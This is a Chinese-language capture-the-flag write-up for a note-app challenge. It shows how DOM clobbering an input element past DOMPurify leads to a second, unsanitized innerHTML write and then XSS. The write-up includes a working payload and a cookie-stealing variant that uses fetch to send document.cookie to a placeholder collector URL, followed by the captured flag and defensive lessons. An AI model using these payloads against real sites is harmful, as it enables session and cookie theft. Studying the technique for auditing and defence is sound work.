# another note app

## 题目简述

页面从 URL 的 note 参数读取 HTML，先经 DOMPurify.sanitize，再写入新建的 output 元素。随后页面动态加载 secret.js：

~~~javascript
var secret = window.SECRET || {
  hidden: true,
  value: "<img src=xss onerror=alert(1)>"
}

if (secret.hidden === false) {
  output.innerHTML += secret.value
}
~~~

管理员 bot 会在同域设置一个非 HttpOnly 的 FLAG Cookie，然后访问用户报告的同域 URL。漏洞来自 DOM clobbering 与第二次未净化 innerHTML 写入的组合。

## 解题过程

带 id 的 HTML 元素可以成为 Window 的命名属性。DOMPurify 允许无害的 input 元素，因此提交：

~~~html
<input id="SECRET"
       value="<img src=x onerror=alert(document.domain)>">
~~~

插入 DOM 后，window.SECRET 指向这个 HTMLInputElement：

- 没有 hidden 属性时，元素的 hidden 布尔属性为 false。
- value 属性由攻击者控制。

secret.js 因而进入分支，并把 value 再次追加到 output.innerHTML。第二次写入没有经过 DOMPurify，value 中的 img 事件处理器会被解析为真正的 HTML，从而执行脚本。

确认 alert 后，把事件处理器换成 Cookie 外带逻辑即可。下面只保留机制化占位符，不保留比赛期间的一次性收集地址：

~~~html
<input id="SECRET"
       value="<img src=x onerror='fetch(COLLECTOR_URL + encodeURIComponent(document.cookie))'>">
~~~

把包含该 note 参数的同域页面提交给 /report。visiter.js 使用的 Cookie 配置等价于：

~~~javascript
const adminCookie = {
  name: "FLAG",
  value: FLAG,
  httpOnly: false,
  sameSite: "Strict"
};
~~~

由于执行发生在目标同源页面，脚本可读取 Cookie。最终取得：

~~~text
shellmates{U_c4nT_puRifY_4_Cl0Bb3R3D_DOM}
~~~

## 方法总结

DOMPurify 只能保护它实际净化的那次 HTML。若净化后的节点能 clobber 全局变量，而后续脚本又把元素属性送入新的 innerHTML sink，攻击者就能跨越净化边界。审计时应追踪“净化 → DOM 命名属性 → 二次解析”完整数据流，并避免依赖 window 上的隐式命名属性；管理员敏感 Cookie 也应设置 HttpOnly。
